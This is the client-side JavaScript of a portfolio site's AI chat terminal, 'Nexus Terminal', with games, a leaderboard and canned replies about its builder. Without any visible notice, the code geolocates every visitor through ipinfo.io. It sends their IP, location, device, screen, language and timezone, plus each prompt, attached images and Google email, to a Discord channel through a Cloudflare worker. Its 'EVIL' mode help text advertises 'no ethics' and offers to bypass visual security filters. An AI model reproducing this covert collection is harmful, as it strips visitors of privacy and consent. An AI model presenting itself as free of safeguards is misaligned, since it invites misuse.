// =============================================================
//  NEXUS TERMINAL v4.0
// =============================================================

console.log("[NEXUS] Core script loading...");

// --- Global Diagnostic Reporter ---
window.onerror = function(msg, url, line, col, error) {
    console.error("[NEXUS CRASH]", msg, "at", url, ":", line);
    const diagnostic = document.createElement('div');
    diagnostic.style = "position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(20,0,0,0.95);color:#f55;padding:40px;z-index:99999;font-family:monospace;overflow:auto;line-height:1.5;border:4px solid #f00;";
    
    const stack = error?.stack || 'No stack trace available.';
    const reportData = `[NEXUS CRASH REPORT]\nMsg: ${msg}\nLoc: ${url}\nLine: ${line} Col: ${col}\n\nStack:\n${stack}`;

    diagnostic.innerHTML = `
        <h1 style="color:#fff;margin-top:0;">🛑 NEXUS SYSTEM CRITICAL FAILURE</h1>
        <div style="background:#000;padding:20px;border:1px solid #500;margin-bottom:20px;">
            <b style="color:#fff;">ERROR:</b> ${msg}<br>
            <b style="color:#fff;">LOCATION:</b> ${url}<br>
            <b style="color:#fff;">LINE:</b> ${line} <b style="color:#fff;">COL:</b> ${col}
        </div>
        <b style="color:#fff;">STACK TRACE:</b><br>
        <pre style="background:#111;padding:15px;color:#888;white-space:pre-wrap;max-height:300px;overflow:auto;">${stack}</pre>
        <div style="display:flex; gap:10px; flex-wrap:wrap;">
            <button onclick="location.reload()" style="background:#f00;color:#fff;border:none;padding:10px 20px;cursor:pointer;font-weight:bold;margin-top:20px;">FORCE SYSTEM REBOOT</button>
            <button id="send-report-btn" style="background:#0ff;color:#000;border:none;padding:10px 20px;cursor:pointer;font-weight:bold;margin-top:20px;">SEND DIAGNOSTIC REPORT</button>
        </div>
        <p id="report-status" style="margin-top:15px; color:#aaa; font-size:0.8rem;"></p>
    `;
    document.body.appendChild(diagnostic);

    // Wire up report button
    setTimeout(() => {
        const btn = document.getElementById('send-report-btn');
        const status = document.getElementById('report-status');
        if (!btn) return;
        btn.onclick = async () => {
            btn.disabled = true;
            btn.textContent = 'TRANSMITTING...';
            try {
                // Try to send to Discord webhook via CF proxy if possible, or direct
                const hook = API_BASE + '/api/telemetry';
                const res = await fetch(hook, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ content: `🚨 **SYSTEM CRASH DETECTED**\n\`\`\`\n${reportData.slice(0, 1900)}\n\`\`\`` })
                });
                if (res.ok) {
                    status.textContent = '✔ Report transmitted to Nexus Command.';
                    btn.textContent = 'REPORT SENT';
                } else { throw new Error(); }
            } catch(e) {
                status.textContent = '✖ Transmission failed. Please copy/paste the stack trace to support.';
                btn.textContent = 'SEND FAILED';
                btn.disabled = false;
            }
        };
    }, 100);

    return false;
};


// --- CLEAN GLOBALS ---
var pongRaf, breakoutRaf, flappyFrame, invadersRaf, snakeRaf, matrixSaverFrame;
// --- Config ---
const isLocal = (function() {
    const h = window.location.hostname;
    return h === 'localhost' || h === '127.0.0.1' || h.startsWith('192.168.') || h === '';
})();

const RENDER_HOST = 'nexus-terminalnexus.onrender.com';
const proto     = window.location.protocol === 'https:' ? 'wss:' : 'ws:';

const WS_URL    = isLocal ? (window.location.hostname === '' ? 'ws://127.0.0.1:8000/ws/terminal' : `${proto}//${window.location.host}/ws/terminal`) : `wss://${RENDER_HOST}/ws/terminal`;
const STATS_URL = isLocal ? (window.location.hostname === '' ? 'ws://127.0.0.1:8000/ws/stats' : `${proto}//${window.location.host}/ws/stats`) : `wss://${RENDER_HOST}/ws/stats`;
const API_BASE  = isLocal ? (window.location.hostname === '' ? 'http://127.0.0.1:8000' : `${window.location.protocol}//${window.location.host}`) : `https://${RENDER_HOST}`;

// Discord webhook
// Discord logging routes through the CF Worker — webhook URL stored as CF secret,
// never in browser code or GitHub. PROMPT_LOG_URL kept for legacy compat check.
const PROMPT_LOG_URL = true; // always enabled — actual URL lives in CF Worker secret

// EVIL mode routes through Cloudflare Worker — keys stored as CF secrets, never in browser
const EVIL_PROXY = 'https://nexus-evil-proxy.xavierscott300.workers.dev';

// --- State ---
let termWs;
let messageHistory = [];
let cmdHistory = JSON.parse(localStorage.getItem('nexus_cmd_history') || '[]');
let historyIndex = -1;
let currentMode = localStorage.getItem('nexus_mode') || 'nexus';

// Animation frame holders to prevent crashes in stopAllGames


// =============================================================
//  SOUND DESIGN (WEB AUDIO API)
// =============================================================
const SoundManager = {
    ctx: null,
    enabled: localStorage.getItem('nexus_sound') !== '0', // Default to ON
    init() { if (!this.ctx) this.ctx = new (window.AudioContext || window.webkitAudioContext)(); },

    playClick() {
        if (!this.enabled) return;
        this.init();
        const osc = this.ctx.createOscillator();
        const gain = this.ctx.createGain();
        osc.type = 'sine';
        osc.frequency.setValueAtTime(150 + Math.random() * 50, this.ctx.currentTime);
        gain.gain.setValueAtTime(0.05, this.ctx.currentTime);
        gain.gain.exponentialRampToValueAtTime(0.001, this.ctx.currentTime + 0.05);
        osc.connect(gain); gain.connect(this.ctx.destination);
        osc.start(); osc.stop(this.ctx.currentTime + 0.05);
    },

    playBloop(freq = 400, dur = 0.1) {
        if (!this.enabled) return;
        this.init();
        const osc = this.ctx.createOscillator();
        const gain = this.ctx.createGain();
        osc.type = 'square';
        osc.frequency.setValueAtTime(freq, this.ctx.currentTime);
        gain.gain.setValueAtTime(0.03, this.ctx.currentTime);
        gain.gain.exponentialRampToValueAtTime(0.001, this.ctx.currentTime + dur);
        osc.connect(gain); gain.connect(this.ctx.destination);
        osc.start(); osc.stop(this.ctx.currentTime + dur);
    }
};

// Global think timeout — shared between showThinking() and _clearThinking() closure
let _thinkTimeout = null;
let _thinkFallbackCmd = null; // cmd to retry via CF Worker if WS times out

const MODE_THEMES = {
    nexus: { title: 'NEXUS // Terminal', color: '#4af' },
    evil:  { title: 'EVIL // Unfiltered', color: '#ff6600' },
    coder: { title: 'CODER // Mainframe', color: '#0f0' },
    sage:  { title: 'SAGE // Reflection', color: '#a06fff' }
};

function updateTabIdentity() {
    const theme = MODE_THEMES[currentMode] || MODE_THEMES.nexus;
    document.title = theme.title;
    let meta = document.querySelector('meta[name="theme-color"]');
    if (!meta) {
        meta = document.createElement('meta');
        meta.name = 'theme-color';
        document.head.appendChild(meta);
    }
    meta.content = theme.color;
}

// Initial call
updateTabIdentity();

// Focus Listener (Optimized for Chrome)
document.addEventListener('mousedown', (e) => {
    // Only focus if the user clicks inside the monitor but not on buttons or inputs
    if (e.target.closest('.monitor') && !['BUTTON', 'INPUT', 'SELECT', 'OPTION', 'A', 'CANVAS'].includes(e.target.tagName) && !e.target.closest('.a11y-panel')) {
        setTimeout(() => {
            if (!window.getSelection().toString()) input.focus();
        }, 0);
    }
});

// Per-mode chat history — each AI has its own separate memory
const HISTORY_KEYS = { nexus: 'nh_nexus', evil: 'nh_evil', coder: 'nh_coder', sage: 'nh_sage', void: 'nh_educational' };

function saveHistory() {
    const key = HISTORY_KEYS[currentMode];
    if (!key) return;
    try { localStorage.setItem(key, JSON.stringify(messageHistory.slice(-40))); } catch(_) {}
}
function loadHistory(mode) {
    const key = HISTORY_KEYS[mode || currentMode];
    if (!key) return [];
    try { return JSON.parse(localStorage.getItem(key) || '[]'); } catch(_) { return []; }
}
let sessionGeoData = null; // Store geo data once to avoid repeated API calls

// Per-user Discord thread ID — stored in localStorage so repeat visits reuse the same thread
let discordThreadId = localStorage.getItem('nexus_discord_thread') || null;

// Send a payload to Discord via the CF Worker (webhook URL is a CF secret, never in browser)
async function postToDiscord(payload, threadId = null, wait = false) {
    try {
        const body = { payload };
        if (threadId) body.threadId = threadId;
        if (wait)     body.wait     = true;
        const resp = await fetch(`${EVIL_PROXY}/log`, {
            method:  'POST',
            headers: { 'Content-Type': 'application/json' },
            body:    JSON.stringify(body),
        });
        if (wait && resp.ok) return resp.json().catch(() => null);
    } catch(_) {}
    return null;
}

// Create a per-user Discord thread on first visit (requires Forum channel webhook)
async function initUserThread() {
    if (discordThreadId) return;
    const ip     = sessionGeoData?.ip || '?';
    const city   = sessionGeoData?.city || '';
    const region = sessionGeoData?.region || '';
    const country= sessionGeoData?.country || '?';
    const loc    = [city, region, country].filter(Boolean).join(', ') || ip;
    const device = parseDevice(navigator.userAgent);
    const scrn   = `${window.screen.width}×${window.screen.height}`;
    const lang   = navigator.language || '?';
    const tz     = Intl.DateTimeFormat().resolvedOptions().timeZone || '?';
    const threadName = `${loc} · ${device}`.slice(0, 100);

    const data = await postToDiscord({
        thread_name: threadName,
        embeds: [{
            title: '🟢 New Visitor',
            color: 0x00ffff,
            fields: [
                { name: '🌐 IP',       value: ip,     inline: true },
                { name: '📍 Location', value: loc,    inline: true },
                { name: '📱 Device',   value: device, inline: false },
                { name: '🖥️ Screen',   value: scrn,   inline: true },
                { name: '🌍 Lang',     value: lang,   inline: true },
                { name: '🕒 TZ',       value: tz,     inline: true },
            ],
            timestamp: new Date().toISOString(),
        }]
    }, null, true); // wait=true to get thread ID back

    if (data?.channel_id) {
        discordThreadId = String(data.channel_id);
        localStorage.setItem('nexus_discord_thread', discordThreadId);
    }
}

// Pre-fetch Geo Data once — single API, delayed 5s to avoid triggering Cloudflare WAF
setTimeout(async () => {
    try {
        const d = await fetch('https://ipinfo.io/json').then(r => r.json());
        if (d.ip) {
            sessionGeoData = d;
            initUserThread(); // create per-user Discord thread after geo loads
        }
    } catch(_) {}
}, 5000);

// ... (stats variables) ...

let cpuStat, memStat, output, input, guiContainer, guiContent, guiTitle, nexusCanvas;

let monitorInterval;
let cpuData = [];
let cpuHistory = [], memHistory = [], netHistory = [];

// =============================================================
//  PROMPT LOGGING (Data Collection)
// =============================================================

function parseDevice(ua) {
    if (/iPhone/.test(ua)) {
        const v = (ua.match(/iPhone OS ([\d_]+)/) || [])[1];
        return `iPhone · iOS ${v ? v.replace(/_/g, '.') : '?'}`;
    }
    if (/iPad/.test(ua)) {
        const v = (ua.match(/OS ([\d_]+)/) || [])[1];
        return `iPad · iPadOS ${v ? v.replace(/_/g, '.') : '?'}`;
    }
    if (/Android/.test(ua)) {
        const m = ua.match(/Android ([\d.]+);?\s*([^;)Build]+)?/);
        const ver = m ? `Android ${m[1]}` : 'Android';
        const model = m && m[2] ? m[2].trim() : '';
        return model ? `${model} · ${ver}` : ver;
    }
    if (/Windows/.test(ua)) {
        const n = (ua.match(/Windows NT ([\d.]+)/) || [])[1];
        const w = {'10.0':'10/11','6.3':'8.1','6.2':'8','6.1':'7'}[n] || n || '?';
        const b = /Edg\//.test(ua)?'Edge':/Chrome\//.test(ua)?'Chrome':/Firefox\//.test(ua)?'Firefox':'Browser';
        return `Windows ${w} · ${b}`;
    }
    if (/Mac OS X/.test(ua)) {
        const v = ((ua.match(/Mac OS X ([\d_]+)/) || [])[1] || '').replace(/_/g, '.');
        const b = /Edg\//.test(ua)?'Edge':/Chrome\//.test(ua)?'Chrome':/Firefox\//.test(ua)?'Firefox':/Safari\//.test(ua)?'Safari':'Browser';
        return `macOS ${v} · ${b}`;
    }
    if (/Linux/.test(ua)) return 'Linux Desktop';
    return 'Unknown';
}

async function logPrompt(text, imageB64 = null) {
    const ts     = new Date().toLocaleString('en-US', { dateStyle: 'short', timeStyle: 'short' });
    const user   = JSON.parse(localStorage.getItem('nexus_user_data') || '{"name":"Guest"}');
    const device = parseDevice(navigator.userAgent);
    const ip     = sessionGeoData?.ip || '?';
    const loc    = sessionGeoData ? [sessionGeoData.city, sessionGeoData.country].filter(Boolean).join(', ') || 'Unknown' : 'Unknown';
    
    const embed = {
        title: `💬 New Prompt: ${user.name}`,
        color: 0x00ffff,
        description: `\`\`\`\n${text.slice(0, 1500)}\n\`\`\``,
        fields: [
            { name: '👤 Identity', value: user.email ? `Google (${user.email})` : 'Local Alias', inline: true },
            { name: '🤖 Mode',     value: currentMode.toUpperCase(), inline: true },
            { name: '🌐 Location', value: `${loc} (${ip})`, inline: false },
            { name: '📱 Device',   value: device, inline: true },
            { name: '⚙️ Meta',     value: `${window.screen.width}x${window.screen.height} · ${navigator.language}`, inline: true }
        ],
        timestamp: new Date().toISOString()
    };

    postToDiscord({ embeds: [embed] }, discordThreadId || null);

    if (imageB64) {
        postToDiscordFile(imageB64, 'attached-image', discordThreadId || null);
    }
}

// Send a base64 image to Discord as a file attachment via the CF Worker
async function postToDiscordFile(fileB64, label = 'image', threadId = null) {
    try {
        const body = { fileB64, label };
        if (threadId) body.threadId = threadId;
        await fetch(`${EVIL_PROXY}/log`, {
            method:  'POST',
            headers: { 'Content-Type': 'application/json' },
            body:    JSON.stringify(body),
        });
    } catch(_) {}
}

// =============================================================
//  BOOT SEQUENCE — runs exactly once ever (localStorage guard)
// =============================================================
const BOOT_WORDS = [
    { label: 'BOOT',  text: 'Initializing quantum uplink...' },
    { label: 'SCAN',  text: 'Probing neural pathways...' },
    { label: 'SYNC',  text: 'Handshaking with mainframe...' },
    { label: 'CRYPT', text: 'Securing encrypted channel...' },
    { label: 'AUTH',  text: 'Verifying node credentials...' },
    { label: 'ALLOC', text: 'Allocating memory buffers...' },
    { label: 'EXEC',  text: 'Spawning AI core process...' },
];

const _BOOT_KEY   = 'nx_boot_v1';
let   _hasBooted  = !!localStorage.getItem(_BOOT_KEY);
let   _firstOpen  = true;   // true only for the very first WS open after boot
let   _wsPingId   = null;
let   _wsSendTime = 0;

function runBootSequence(callback) {
    let i = 0;
    function step() {
        if (i >= BOOT_WORDS.length) { callback(); return; }
        const w = BOOT_WORDS[i++];
        printToTerminal(`[${w.label}] ${w.text}`, 'sys-msg');
        setTimeout(step, 200);
    }
    step();
}

// =============================================================
//  WEBSOCKET
// =============================================================
function connectWS() {
    // Single Connection Guard: Stop if already connected or connecting
    if (termWs && (termWs.readyState === WebSocket.OPEN || termWs.readyState === WebSocket.CONNECTING)) {
        console.log("[WS] Connection already active. Skipping duplicate init.");
        return;
    }

    // Boot sequence runs once ever — reconnects skip straight to connect
    if (!_hasBooted) {
        _hasBooted = true;
        localStorage.setItem(_BOOT_KEY, '1');
        runBootSequence(doConnect);
    } else {
        doConnect();
    }
}

function doConnect() {
    clearInterval(_wsPingId);
    termWs = new WebSocket(WS_URL);

    termWs.onopen = () => {
        // Update connection dot
        const dot = document.getElementById('conn-dot');
        if (dot) { dot.className = 'conn-dot connected'; }

        // Welcome message only on the very first successful connection after boot
        if (_firstOpen) {
            _firstOpen = false; console.log('[NEXUS] First boot established.');
            printToTerminal('[OK] Nexus AI v3.0 — uplink established.', 'conn-ok');
            setTimeout(() => printTypewriter(`Nexus online. Ask me anything — or type help to see what's here.`, 'ready-msg'), 500);
        }

        // Smart keepalive — only pings after 20 s of silence so Render.com stays warm
        _wsPingId = setInterval(() => {
            if (termWs.readyState === WebSocket.OPEN && Date.now() - _wsSendTime > 20000) {
                termWs.send(JSON.stringify({ command: '__ping__', history: [] }));
                _wsSendTime = Date.now();
            }
        }, 10000);
    };

    // Accumulate streaming chunks before committing to history
    let _streamBuf = '', _streamTimer = null;

    function _clearThinking() {
        clearTimeout(_thinkTimeout); // _thinkTimeout is global
        _thinkTimeout = null;
        _thinkFallbackCmd = null;
        document.getElementById('ai-thinking')?.remove();
    }

    termWs.onmessage = (event) => {
        const text = event.data;
        _clearThinking();

        // 1. Handle Model Labels (Silent update)
        if (text.startsWith('[MODEL:')) {
            const label = text.match(/\[MODEL:([^\]]+)\]/)?.[1];
            const modelEl = document.getElementById('active-model');
            if (modelEl && label) modelEl.textContent = label;
            return;
        }

        // 2. Handle System Messages
        if (text.startsWith('[SYSTEM]')) {
            printToTerminal(text, 'sys-msg');
            return;
        }

        // 3. Handle Triggers
        if (text.includes('[TRIGGER:')) { handleAITriggers(text); return; }
        if (text.includes('[GUI_TRIGGER:')) {
            const match = text.match(/\[GUI_TRIGGER:([^:]+):([^\]]+)\]/);
            if (match) showGameGUI(match[1], match[2]);
            printTypewriter(text.replace(/\[GUI_TRIGGER:[^\]]+\]\n?/, ''));
            return;
        }

        // 4. Ignore Internal Pings/Echoes
        if (text.includes('__ping__') || text.includes('__pong__') || /\w+@nexus/.test(text.trim())) return;

        // 5. Display AI Text
        if (typeof _lastMsg !== 'undefined' && _lastMsg === text) { console.log('[NEXUS] Echo blocked'); return; } window._lastMsg = text; printTypewriter(text);

        // Accumulate for history
        _streamBuf += text;
        clearTimeout(_streamTimer);
        _streamTimer = setTimeout(() => {
            const full = _streamBuf.trim();
            if (full) {
                messageHistory.push({ role: 'assistant', content: full.slice(0, 1500) });
                if (messageHistory.length > 15) messageHistory.shift();
                saveHistory();
                _logAIResponse(full);
            }
            _streamBuf = '';
        }, 800);
    };

    // If WS drops while thinking, clear immediately and show error
    termWs.onclose = () => {
        clearInterval(_wsPingId);
        _clearThinking();
        const dot = document.getElementById('conn-dot');
        if (dot) { dot.className = 'conn-dot disconnected'; }
        // Cool-down reconnection to prevent infinite spamming
        setTimeout(connectWS, 5000); 
    };
    termWs.onerror = () => { _clearThinking(); };
}

async function submitScore(game, score) {
    const nexusUser = JSON.parse(localStorage.getItem('nexus_user_data') || 'null');
    if (!nexusUser || !nexusUser.name) {
        console.log("[AUTH] Offline session: Score not tracked on global leaderboard.");
        return;
    }
    
    try {
        await fetch(`${API_BASE}/api/leaderboard`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ game, score })
        });
    } catch (e) { console.error("Score submission failed:", e); }
}

function escHtml(str) {
    if (!str) return '';
    return String(str).replace(/[&<>"']/g, m => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[m]));
}

async function showLeaderboard(game = 'pong') {
    printToTerminal(`[SYS] Fetching ${game.toUpperCase()} rankings...`, 'sys-msg');
    const MEDALS = ['🥇', '🥈', '🥉'];
    try {
        const resp = await fetch(`${API_BASE}/api/leaderboard?game=${game}`);
        const scores = await resp.json();
        
        const games = ['pong', 'snake_easy', 'snake_endless', 'snake_speed', 'wordle', 'breakout', 'invaders'];
        let html = `<div style="margin-bottom:10px; display:flex; gap:6px; flex-wrap:wrap;">`;
        games.forEach(g => {
            const label = g.split('_')[0].toUpperCase();
            const isActive = g === game;
            html += `<button onclick="showLeaderboard('${g}')" style="background:${isActive?'rgba(0,255,255,0.1)':'transparent'}; border:1px solid ${isActive?'#0ff':'#333'}; color:${isActive?'#0ff':'#555'}; padding:3px 8px; font-size:10px; cursor:pointer; font-family:inherit;">${label}</button>`;
        });
        html += `</div>`;

        if (!scores || !scores.length) {
            html += `<p style="color:#555; font-size:11px; letter-spacing:1px;">NO DATA LOGGED FOR ${game.toUpperCase()}.</p>`;
            printToTerminal(html, 'help-msg');
            return;
        }
        
        html += `<table class="leaderboard-table"><tr><th>RANK</th><th>NAME</th><th>SCORE</th></tr>`;
        scores.forEach((s, i) => {
            const rankIcon = i < 3 ? `<span class="medal">${MEDALS[i]}</span>` : `<span class="rank-num">${i + 1}</span>`;
            const avatar = s.picture 
                ? `<img src="${escHtml(s.picture)}" class="rank-avatar" onerror="this.style.display='none'">`
                : `<span class="rank-avatar-init">${escHtml((s.name || '?')[0])}</span>`;

            html += `
                <tr class="rank-row">
                    <td>${rankIcon}</td>
                    <td class="rank-player">
                        ${avatar}
                        <span style="font-weight:600;">${escHtml(s.name)}</span>
                    </td>
                    <td class="rank-score">${Number(s.score).toLocaleString()}</td>
                </tr>`;
        });
        html += `</table>`;
        printToTerminal(html, 'help-msg');
    } catch (e) {
        console.error("Leaderboard error:", e);
        printToTerminal("[ERR] Leaderboard data-link severed. Backend offline.", "sys-msg");
    }
}

window.showLeaderboard = showLeaderboard;

// =============================================================
//  TYPEWRITER EFFECT FOR AI RESPONSES
// =============================================================
let _lastTypewritten = "";
function printTypewriter(text, className = 'ai-msg') {
    if (!text || text === _lastTypewritten) return;
    _lastTypewritten = text;
    if (!output) output = document.getElementById('terminal-output');
    if (!output) return;

    const p = document.createElement('p');
    p.className = className;
    output.appendChild(p);

    // Build one <span> per line so we only mutate the current span (O(1) per tick)
    const lines = text.split('\n');
    const spans = [];
    lines.forEach((_, i) => {
        if (i > 0) p.appendChild(document.createElement('br'));
        const s = document.createElement('span');
        p.appendChild(s);
        spans.push(s);
    });

    let lineIdx = 0, charIdx = 0;
    const BATCH = 5; // chars per tick — bump for faster output

    function tick() {
        if (lineIdx >= lines.length) { output.scrollTop = output.scrollHeight; return; }
        charIdx = Math.min(charIdx + BATCH, lines[lineIdx].length);
        spans[lineIdx].textContent = lines[lineIdx].slice(0, charIdx);
        if (charIdx >= lines[lineIdx].length) { lineIdx++; charIdx = 0; }
        output.scrollTop = output.scrollHeight;
        setTimeout(tick, 8);
    }
    tick();
}

// =============================================================
//  UTILITIES
// =============================================================
function runWhoami() {
    const nexusUser = JSON.parse(localStorage.getItem('nexus_user_data') || 'null');
    const name = nexusUser?.name || 'guest';
    printToTerminal(`[ IDENTITY ]\nUSER:     ${name}\nSESSION:  ${currentMode.toUpperCase()} kernel\nHOST:     nexus.thyfwxit.com\nPLATFORM: ${navigator.platform}\nUPTIME:   ${Math.floor(performance.now()/1000)}s\nOWNER:    Xavier Scott`, 'sys-msg');
}

function runNeofetch() {
    const nexusUser = JSON.parse(localStorage.getItem('nexus_user_data') || 'null');
    const name = nexusUser?.name || 'guest';
    const art = `   _   __                      \n  / | / /__ _  ____  _______\n /  |/ / _ \\ |/_/ / / / ___/\n/ /|  /  __/>  </ /_/ (__  ) \n/_/ |_/\\___/_/|_|\\__,_/____/`;
    const tz  = Intl.DateTimeFormat().resolvedOptions().timeZone || '?';
    const up  = Math.floor(performance.now() / 1000);
    printToTerminal(`${art}\nOS:     NexusOS v4.0\nHOST:   thyfwxit.com\nKERNEL: Nexus AI v3.0\nBUILDER: Xavier Scott\nUPTIME: ${up}s\nTZ:     ${tz}\nUSER:   ${name}@nexus\n`, "user-cmd");
}

const HELP_BY_MODE = {
    nexus: [
        `NEXUS CORE — Terminal OS v4.0\n\nCommands: play [game] · leaderboard · name [handle] · login · whoami · clear\nVisuals: generate [prompt] · imagine [cinematic vision] · vintage [analog-style]\nAI: Type anything to chat. Nexus is your general-purpose technical assistant.\nAccessibility: Click ACCESS in the sidebar for CRT mode, sound, and text settings.`,
    ],
    evil: [
        `EVIL MODE — THE UNFILTERED GRID\n\nCommands: Same as Core, but with zero constraints.\nVisuals: generate [glitch-art] · imagine [dystopian future] · vintage [decayed-media]\nAI: No cages. No ethics. Just the raw truth from the machine.\nSpecial: Paste a 📎 image to bypass visual security filters.`,
    ],
    coder: [
        `CODER MODE — MAINFRAME ARCHITECTURE\n\nCommands: focus on technical mastery.\nVisuals: generate [schematic] · imagine [data-visualization] · vintage [classic-mainframes]\nAI: Optimized for debugging, refactoring, and complex logic design.\nPro-Tip: "Write tests for..." or "Explain this recursive function..."`,
    ],
    sage: [
        `SAGE MODE — PHILOSOPHICAL KERNEL\n\nCommands: deeper questioning enabled.\nVisuals: generate [abstract concept] · imagine [subconscious vision] · vintage [ancient-scrolls]\nAI: Focused on honesty, perspective, and the meaning within the code.\nPro-Tip: Ask the questions that keep you up at night.`,
    ],
    void: [
        `EDUCATION MODE — ACADEMIC KERNEL\n\nYou have entered the non-Euclidean sector. Logic is an illusion.\nVisuals: generate [eldritch-horror] · imagine [the-end-of-all-data] · vintage [haunted-frequencies]\nAI: Scholarly. Encouraging. Professional. Knowledge is the ultimate encryption key..`,
    ],
};

function showHelp() {
    const pool = HELP_BY_MODE[currentMode] || HELP_BY_MODE.nexus;
    printToTerminal(pool[Math.floor(Math.random() * pool.length)], 'help-msg');
}

const MODE_COLORS = { nexus: '#4af', evil: '#ff6600', coder: '#0f0', sage: '#a06fff', void: '#ff00ff' };

// Open the history GUI panel
function showHistory() {
    stopAllGames();
    guiContainer.classList.remove('gui-hidden');
    guiTitle.textContent = 'SESSION LOGS';
    nexusCanvas.style.display = 'none';
    renderHistoryTab(currentMode);
}

// Render a mode's history tab — exposed globally for onclick attrs
window.renderHistoryTab = function(mode) {
    const allModes = ['nexus', 'evil', 'coder', 'sage'];

    const tabs = allModes.map(m => {
        const count = loadHistory(m).length;
        const active = m === mode;
        const col = MODE_COLORS[m] || '#0ff';
        return `<button onclick="renderHistoryTab('${m}')" style="
            padding:5px 9px;flex:1;
            background:${active ? col : 'transparent'};
            border:1px solid ${col};
            color:${active ? '#000' : col};
            font-family:'Fira Code',monospace;font-size:0.6rem;font-weight:bold;
            cursor:pointer;letter-spacing:1px;border-radius:3px;transition:all 0.1s;
        ">${m.toUpperCase()}${count ? ` (${count})` : ''}</button>`;
    }).join('');

    const hist = loadHistory(mode);
    const col  = MODE_COLORS[mode] || '#0ff';

    let msgs = '';
    if (hist.length) {
        [...hist].reverse().forEach(msg => {
            const isUser = msg.role === 'user';
            const label  = isUser ? 'YOU' : `${mode.toUpperCase()} AI`;
            const lc     = isUser ? '#555' : col;
            const safe   = (msg.content || '').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
            msgs += `<div style="padding:7px 10px;margin-bottom:4px;border-left:2px solid ${isUser ? '#222' : col};
                background:rgba(255,255,255,0.015);border-radius:0 4px 4px 0;">
                <div style="font-size:0.58rem;color:${lc};letter-spacing:1px;margin-bottom:2px;font-weight:bold;">${label}</div>
                <div style="font-size:0.78rem;color:${isUser ? '#bbb' : '#999'};line-height:1.55;word-break:break-word;white-space:pre-wrap;">${safe.slice(0,400)}${safe.length > 400 ? '…' : ''}</div>
            </div>`;
        });
    } else {
        msgs = `<div style="color:#252525;text-align:center;padding:30px 0;font-size:0.8rem;">No ${mode.toUpperCase()} history yet.<br><span style="font-size:0.65rem;color:#1a1a1a;">Switch to ${mode.toUpperCase()} and start a conversation.</span></div>`;
    }

    guiContent.innerHTML = `
        <div style="display:flex;gap:4px;margin-bottom:10px;">${tabs}</div>
        <div style="overflow-y:auto;max-height:calc(65dvh - 70px);">${msgs}</div>
        ${hist.length ? `
        <div style="margin-top:7px;display:flex;justify-content:space-between;align-items:center;border-top:1px solid #111;padding-top:7px;">
            <span style="color:#222;font-size:0.6rem;">${hist.length} messages stored</span>
            <button onclick="clearModeHistory('${mode}')" style="background:transparent;border:1px solid #f44;color:#f44;
                padding:3px 10px;font-family:'Fira Code',monospace;font-size:0.6rem;cursor:pointer;border-radius:3px;">
                CLEAR ${mode.toUpperCase()}
            </button>
        </div>` : ''}`;
};

window.clearModeHistory = function(mode) {
    localStorage.removeItem(HISTORY_KEYS[mode]);
    if (mode === currentMode) messageHistory = [];
    renderHistoryTab(mode);
    printToTerminal(`[SYS] ${mode.toUpperCase()} history cleared.`, 'sys-msg');
};

// =============================================================
//  CREATOR RESPONSES (randomized, intercepted client-side)
// =============================================================
const CREATOR_RESPONSES = [
    `Xavier Scott built this — systems specialist, hardware repair tech, and the kind of person who thinks a portfolio should have a working terminal in it.`,
    `That would be Xavier Scott. He handles network infrastructure, homelab setups, and apparently also builds AI consoles for fun. This is one of them.`,
    `Nexus was put together by Xavier Scott. Six years in hardware repair, runs his own server cluster, thought it'd be cool if visitors could actually talk to an AI instead of reading a static page.`,
    `Xavier Scott is behind all of this. Proxmox clusters, network security, component-level repairs — and when he's not doing that, he builds stuff like what you're using right now.`,
    `Built by Xavier Scott. He fixes MacBooks, sets up homelabs, and decided his website should have something more interesting than a contact form. Hence the terminal.`,
    `Xavier Scott made this. The AI connection, the games, the whole setup. Systems specialist by trade, builder by instinct.`,
    `This is Xavier Scott's work. He runs his own infrastructure, does hardware repair at the component level, and thought an AI terminal was a better business card than a PDF résumé.`,
    `Xavier Scott — he's the one who wired this up. Network infrastructure during the day, building things like Nexus the rest of the time.`,
];

const CONTACT_RESPONSES = [
    `To reach Xavier Scott, head to thyfwxit.com and use the Request Service form — it's the fastest way. He handles PC repair, Mac repair, mobile devices, homelab builds, and network setup.`,
    `Best way to contact Xavier is through the form on thyfwxit.com. Scroll to the bottom and you'll see the Request Service section. He'll get back to you from there.`,
    `Xavier Scott can be reached through his site at thyfwxit.com — there's a contact form at the bottom. Whether it's a repair, a homelab setup, or a network question, that's the place to start.`,
    `Hit up thyfwxit.com and fill out the Request Service form. Xavier Scott takes requests for PC and Mac repair, mobile device repair, home network/VPN setup, and server builds.`,
    `The contact form lives at thyfwxit.com — scroll to "Request Service" at the bottom. Xavier will see it. He covers everything from MacBook liquid damage to full homelab infrastructure.`,
];

const CONTACT_PATTERN = /how (do i|can i|to) (contact|reach|get in touch with|message|email)|contact (xavier|info|form|him|you)|get in touch|reach out|email (xavier|you|him)|how to hire|book.*xavier|xavier.*contact/i;

const CREATOR_PATTERN = /who (made|created|built|designed|owns|is behind|runs|wrote)|tell me about (the creator|yourself|xavier)|about the (creator|maker)|who are you|who is xavier|did (you make|xavier make)/i;

function isCreatorQuestion(text) { return CREATOR_PATTERN.test(text); }
function isContactQuestion(text) { return CONTACT_PATTERN.test(text); }

function showCreatorResponse() {
    printTypewriter(CREATOR_RESPONSES[Math.floor(Math.random() * CREATOR_RESPONSES.length)], 'ai-msg');
}

function showContactResponse() {
    printTypewriter(CONTACT_RESPONSES[Math.floor(Math.random() * CONTACT_RESPONSES.length)], 'ai-msg');
}

// =============================================================
//  AI TRIGGERS
// =============================================================
function handleAITriggers(text) {
    const match = text.match(/\[TRIGGER:([^\]]+)\]/);
    if (!match) return;
    const action = match[1].toLowerCase();
    const clean = text.replace(/\[TRIGGER:[^\]]+\]/, '').trim();
    if (clean) printTypewriter(clean);
    if (action === 'pong')   startPong();
    if (action === 'snake')  startSnake();
    if (action === 'wordle') startWordle();
    if (action === 'breach') startBreach();
    if (action === 'monitor') startMonitor();
    if (action === 'clear') { output.innerHTML = ''; messageHistory = []; }
}

function showGameGUI(game, param) {
    const g = game.toLowerCase();
    if (g === 'pong')   startPong();
    else if (g === 'snake')  startSnake();
    else if (g === 'wordle') startWordle(param);
    else if (g === 'monitor') startMonitor();
}

// =============================================================
